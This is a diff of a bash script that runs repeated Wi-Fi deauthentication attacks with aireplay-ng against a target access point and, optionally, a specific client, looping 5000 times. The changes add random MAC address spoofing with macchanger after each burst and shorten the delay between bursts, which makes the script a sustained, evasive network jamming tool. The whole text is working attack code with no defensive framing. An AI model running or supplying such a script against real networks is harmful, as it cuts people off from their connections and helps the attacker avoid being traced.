@@ -1,9 +1,20 @@
 #!/bin/bash
 
-TARGET=$1
+TARGETAP=$1
 
-for i in {1..5000}
-do
-	aireplay-ng -0 100 -a $TARGET mon0
-	sleep 60s
-done       
+if [ -n "$2" ]; then
+	TARGETSTAT=$2
+	for i in {1..5000}
+	do
+		aireplay-ng -0 20 -a $TARGETAP -c $TARGETSTAT mon0
+		macchanger -r mon0 > /dev/null
+		sleep 1s
+	done
+else
+	for i in {1..5000}
+	do
+		aireplay-ng -0 20 -a $TARGETAP mon0
+		macchanger -r mon0 > /dev/null
+		sleep 1s
+	done
+fi
